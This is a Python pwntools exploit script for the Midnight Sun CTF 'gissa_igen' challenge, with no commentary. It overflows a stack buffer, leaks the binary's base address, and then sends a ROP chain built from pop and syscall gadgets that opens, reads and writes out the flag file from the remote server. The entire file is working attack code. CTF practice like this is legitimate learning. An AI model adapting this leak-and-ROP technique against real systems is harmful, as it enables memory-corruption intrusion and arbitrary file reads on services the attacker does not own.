#!/usr/bin/env python
from pwn import *

def send(flag):
    s.sendafter('/3): ', flag)

if len(sys.argv) == 1:
    s = process('./gissa_igen')
else:
    s = remote('gissa-igen-01.play.midnightsunctf.se', 4096)

elf = ELF('./gissa_igen')

send('\n')
send('A' * 0x8c + p32(0xa0) + '\n')
send('A' * 0x98 + '\xff' * 8)

s.recvuntil('\xff' * 8)
text_base = u64(s.recvuntil(' ')[:-1].ljust(8, '\0')) - 0xbb7
log.info('text base: %#x' % text_base)

pop3 = text_base + 0xc21 # pop rax ; pop rdi ; pop rsi ; ret
pop5 = text_base + 0xc1d # pop rdx ; pop r9 ; pop r8 ; pop rdi ; pop rsi ; ret
syscall = text_base + 0xbd9

payload = ''
payload += 'A' * 0x8e
payload += '\0' * 2
payload += 'A' * 8
payload += p64(3)
payload += 'A' * 8

# open("/home/ctf/flag", 0)
flag_addr = text_base + elf.search('/home/ctf/flag').next()
payload += p64(pop3) + p64(0x40000002) + p64(flag_addr) + p64(0)
payload += p64(syscall)

# read(3, bss, 0x100)
payload += p64(pop5) + p64(0x100) * 5
payload += p64(pop3) + p64(0) + p64(3) + p64(text_base + elf.bss(0x100))
payload += p64(syscall)

# write(1, bss, 0x100)
payload += p64(pop5) + p64(0x100) * 5
payload += p64(pop3) + p64(1) + p64(1) + p64(text_base + elf.bss(0x100))
payload += p64(syscall)

payload += '\n'

send(payload)
s.recvline()
print s.recvuntil('\0')[:-1]
